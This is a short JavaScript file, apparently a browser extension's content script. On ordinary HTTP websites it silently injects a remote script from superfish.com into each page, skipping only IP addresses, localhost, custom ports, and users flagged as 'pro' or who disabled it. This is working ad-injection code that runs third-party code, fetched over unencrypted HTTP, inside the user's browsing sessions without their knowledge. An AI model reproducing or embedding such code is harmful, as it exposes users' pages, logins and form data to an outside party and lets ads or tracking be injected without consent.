(function() {
  var addScript;

  if (location.protocol !== "http:") {
    return;
  }

  if (location.port !== "") {
    return;
  }

  if (location.hostname.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/)) {
    return;
  }

  if (!(location.hostname.split(".").length > 1)) {
    return;
  }

  if (location.hostname.indexOf("localhost", location.hostname.length - "localhost".length) !== -1) {
    return;
  }

  addScript = function(url) {
    var tag;
    tag = document.createElement("script");
    tag.type = "text/javascript";
    tag.src = url;
    return document.getElementsByTagName("head")[0].appendChild(tag);
  };

  chrome.storage.local.get(["country", "pro", "superfish_disabled"], function(data) {
    var age, now;
    if (data && data.pro === true) {
      return;
    }
    if (data && data.superfish_disabled === true) {
      return;
    }
    now = parseInt((new Date).getTime() / 1000);
    if (data && data.country && data.country.time) {
      age = now - data.country.time;
    }
    return addScript("http://www.superfish.com/ws/sf_main.jsp?dlsource=irusvef&CTID=sntp");
  });

}).call(this);
